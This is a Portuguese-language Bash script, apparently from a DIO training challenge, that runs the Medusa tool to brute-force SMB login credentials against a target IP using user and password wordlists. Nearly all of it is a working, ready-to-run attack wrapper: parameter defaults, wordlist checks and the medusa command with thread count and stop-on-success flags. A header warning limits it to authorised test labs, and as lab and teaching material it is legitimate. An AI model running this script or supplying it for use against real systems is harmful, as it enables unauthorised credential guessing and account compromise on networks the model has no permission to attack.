#!/bin/bash

# Script de Ataque de Força Bruta SMB com Medusa
# Autor: Desafio DIO - Ataques de Força Bruta
# Data: 2025-10-21
# Descrição: Este script demonstra como realizar um ataque de força bruta
#            em um serviço SMB utilizando a ferramenta Medusa.

# AVISO: Este script deve ser utilizado APENAS em ambientes de teste controlados
#        e com autorização explícita. O uso não autorizado é ILEGAL.

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Função para exibir banner
show_banner() {
    echo -e "${GREEN}"
    echo "╔═══════════════════════════════════════════════════════╗"
    echo "║        Ataque de Força Bruta SMB - Medusa            ║"
    echo "║              Desafio DIO - 2025                      ║"
    echo "╚═══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Função para verificar se o Medusa está instalado
check_medusa() {
    if ! command -v medusa &> /dev/null; then
        echo -e "${RED}[!] Medusa não está instalado!${NC}"
        echo -e "${YELLOW}[*] Instale com: sudo apt install medusa${NC}"
        exit 1
    fi
    echo -e "${GREEN}[✓] Medusa está instalado${NC}"
}

# Função principal
main() {
    show_banner
    check_medusa
    
    # Configurações
    TARGET_IP="${1:-192.168.56.102}"
    USER_FILE="${2:-../wordlists/users.txt}"
    PASS_FILE="${3:-../wordlists/passwords.txt}"
    THREADS="${4:-4}"
    
    echo -e "${YELLOW}[*] Configurações do Ataque:${NC}"
    echo "    - Target IP: $TARGET_IP"
    echo "    - User File: $USER_FILE"
    echo "    - Pass File: $PASS_FILE"
    echo "    - Threads: $THREADS"
    echo ""
    
    # Verificar se os arquivos existem
    if [ ! -f "$USER_FILE" ]; then
        echo -e "${RED}[!] Arquivo de usuários não encontrado: $USER_FILE${NC}"
        exit 1
    fi
    
    if [ ! -f "$PASS_FILE" ]; then
        echo -e "${RED}[!] Arquivo de senhas não encontrado: $PASS_FILE${NC}"
        exit 1
    fi
    
    echo -e "${YELLOW}[*] Iniciando ataque de força bruta SMB...${NC}"
    echo ""
    
    # Executar Medusa
    medusa -h "$TARGET_IP" \
           -U "$USER_FILE" \
           -P "$PASS_FILE" \
           -M smbnt \
           -t "$THREADS" \
           -v 6 \
           -f
    
    echo ""
    echo -e "${GREEN}[✓] Ataque concluído!${NC}"
}

# Exibir ajuda
if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    echo "Uso: $0 [TARGET_IP] [USER_FILE] [PASS_FILE] [THREADS]"
    echo ""
    echo "Exemplos:"
    echo "  $0                                    # Usar valores padrão"
    echo "  $0 192.168.1.100                      # Especificar apenas o IP"
    echo "  $0 192.168.1.100 users.txt pass.txt 8 # Especificar todos os parâmetros"
    echo ""
    exit 0
fi

# Executar função principal
main "$@"

